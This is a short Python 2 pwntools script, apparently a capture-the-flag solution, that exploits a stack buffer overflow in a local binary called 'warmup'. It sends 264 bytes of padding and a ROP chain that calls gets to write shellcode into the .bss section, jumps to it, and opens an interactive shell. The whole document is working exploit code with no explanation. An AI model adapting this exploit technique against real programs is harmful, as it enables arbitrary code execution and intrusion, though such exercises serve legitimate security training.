#!/usr/bin/env python2 

from pwn import* 
context.arch = 'amd64'

p = process('./warmup')

pop_rdi = 0x0000000000400773
bss = 0x00601000 + 0x500
gets_plt = 0x400580



padding = "A"*264

payload = ""
payload += padding 
payload += flat(pop_rdi,bss,gets_plt,bss)

sc = asm(shellcraft.sh())

p.sendline(payload)
p.sendline(sc)

p.interactive()
